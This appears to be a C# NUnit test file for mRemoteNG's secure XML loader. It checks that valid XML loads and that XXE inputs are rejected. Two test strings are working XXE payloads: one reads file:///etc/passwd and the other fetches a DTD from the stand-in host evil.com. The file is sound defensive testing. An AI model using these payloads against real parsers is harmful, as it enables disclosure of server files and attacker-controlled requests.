using System;
using System.Xml;
using mRemoteNG.Security;
using NUnit.Framework;

namespace mRemoteNGTests.Security
{
    [TestFixture]
    public class SecureXmlHelperTests
    {
        [Test]
        public void LoadXmlFromString_LoadsValidXml()
        {
            string validXml = "<?xml version=\"1.0\"?><root><item>test</item></root>";
            XmlDocument doc = SecureXmlHelper.LoadXmlFromString(validXml);
            
            Assert.That(doc, Is.Not.Null);
            Assert.That(doc.DocumentElement?.Name, Is.EqualTo("root"));
            Assert.That(doc.SelectSingleNode("/root/item")?.InnerText, Is.EqualTo("test"));
        }

        [Test]
        public void LoadXmlFromString_RejectsXxeAttack()
        {
            // This is a typical XXE attack payload
            string xxeXml = @"<?xml version='1.0'?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM 'file:///etc/passwd' >]>
<root><item>&xxe;</item></root>";

            // Should throw exception because DTD processing is prohibited
            Assert.Throws<XmlException>(() => SecureXmlHelper.LoadXmlFromString(xxeXml));
        }

        [Test]
        public void CreateSecureXmlDocument_ReturnsConfiguredDocument()
        {
            XmlDocument doc = SecureXmlHelper.CreateSecureXmlDocument();
            
            Assert.That(doc, Is.Not.Null);
        }

        [Test]
        public void LoadXmlFromString_RejectsExternalEntity()
        {
            // Another XXE variant using external entity
            string externalEntityXml = @"<?xml version='1.0'?>
<!DOCTYPE foo [
<!ENTITY ext SYSTEM 'http://evil.com/malicious.dtd'>
]>
<root>&ext;</root>";

            Assert.Throws<XmlException>(() => SecureXmlHelper.LoadXmlFromString(externalEntityXml));
        }

        [Test]
        public void LoadXmlFromString_HandlesXmlWithComments()
        {
            string xmlWithComments = @"<?xml version='1.0'?>
<root>
    <!-- This is a comment -->
    <item>test</item>
</root>";

            // Comments should be ignored per the secure settings
            XmlDocument doc = SecureXmlHelper.LoadXmlFromString(xmlWithComments);
            
            Assert.That(doc, Is.Not.Null);
            Assert.That(doc.DocumentElement?.Name, Is.EqualTo("root"));
        }

        [Test]
        public void LoadXmlFromString_HandlesXmlWithProcessingInstructions()
        {
            string xmlWithPi = @"<?xml version='1.0'?>
<?xml-stylesheet type='text/xsl' href='style.xsl'?>
<root>
    <item>test</item>
</root>";

            // Processing instructions should be ignored per the secure settings
            XmlDocument doc = SecureXmlHelper.LoadXmlFromString(xmlWithPi);
            
            Assert.That(doc, Is.Not.Null);
            Assert.That(doc.DocumentElement?.Name, Is.EqualTo("root"));
        }
    }
}
